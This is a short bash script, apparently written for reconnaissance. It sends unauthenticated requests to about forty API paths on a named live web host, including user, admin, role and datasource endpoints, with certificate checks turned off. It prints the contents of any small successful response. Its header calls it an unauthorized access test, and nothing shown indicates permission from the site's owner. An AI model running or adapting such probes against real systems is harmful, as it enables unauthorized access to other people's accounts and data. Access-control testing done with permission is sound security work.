#!/bin/bash
# Probe DataViz API endpoints found in JS
apis=(
  "/login"
  "/user/detail"
  "/user/inquire"
  "/user/batch"
  "/user/loadUserAndAuth"
  "/adminUser/detail"
  "/adminUser/inquire"
  "/role/detail"
  "/role/inquire"
  "/system/inquire"
  "/ac/detail"
  "/ac/inquire"
  "/datasource/detail"
  "/datasource/inquire"
  "/datasource/assign"
  "/controller/dropdown"
  "/controller/inquire"
  "/controller/lookup"
  "/reportGroup/detail"
  "/reportGroup/inquire"
  "/rpt/detail"
  "/stdRpt/detail"
  "/standardReportTmpl/detail"
  "/standardReportTmpl/inquire"
  "/inqTmpl/detail"
  "/inquire/detail"
  "/inquire/inquire"
  "/inquireReportAdmin"
  "/view/detail"
  "/view/inquire"
  "/dev/component"
  "/supp/houseKeep"
  "/theme"
  "/uiStandard"
  "/uiTmpl/detail"
  "/uiTmpl/inquire"
  "/myTemplates"
  "/pageReport"
  "/createReport"
  "/touch"
  "/app/"
  "/app"
)

echo "=== DataViz API Unauthorized Access Test ==="
echo "Target: https://dataviz.weikayun.com"
echo ""

for path in "${apis[@]}"; do
  result=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" --connect-timeout 10 -k "https://dataviz.weikayun.com${path}" 2>/dev/null)
  code=$(echo "$result" | cut -d: -f1)
  size=$(echo "$result" | cut -d: -f2)
  echo "[$code] [$size b] $path"
  # If 200 and not too large, show the content
  if [ "$code" = "200" ] && [ "$size" -gt "0" ] && [ "$size" -lt "10000" ]; then
    content=$(curl -s --connect-timeout 10 -k "https://dataviz.weikayun.com${path}" 2>/dev/null)
    echo "  ---> $content"
  fi
done
